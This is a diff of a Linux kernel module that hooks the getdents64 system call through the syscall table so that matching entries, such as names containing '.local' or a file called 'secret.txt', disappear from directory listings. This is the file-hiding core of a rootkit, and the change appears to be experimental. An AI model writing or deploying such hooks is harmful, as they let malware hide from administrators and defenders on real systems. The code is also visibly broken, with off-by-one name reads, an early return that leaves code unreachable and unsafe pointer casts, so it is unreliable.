@@ -14,21 +14,22 @@ MODULE_LICENSE("GPL");
 
 void **sys_call_table;
 
-#define FILE_NAME "thisisatestfile.txt"
+#define FILE_NAME "secret.txt"
+
 
 asmlinkage int (*original_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
 asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
-	printk("seodoekdoed");
         int rtn;
         struct linux_dirent64 *cur = dirp;
         int i = 0;
         rtn = original_getdents64(fd, dirp, count);
         while (i < rtn) {
-		if (1){
-              //  if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
-                        int reclen = cur->d_reclen;
+		if(strncmp(cur->d_name-1, ".local", 6)==0){
+              // if (strncmp(cur->d_name-1, FILE_NAME, strlen(FILE_NAME)) == 0) {
+                       return 0;
+			 int reclen = cur->d_reclen;
                         char *next_rec = (char *)cur + reclen;
                         int len = (int)dirp + rtn - (int)next_rec;
                         memmove(cur, next_rec, len);
@@ -38,6 +39,7 @@ asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp,
                 i += cur->d_reclen;
                 cur = (struct linux_dirent64*) ((char*)dirp + i);
         }
+	printk("uuuuuuu %s", cur->d_name-1);
         return rtn;
 }
 
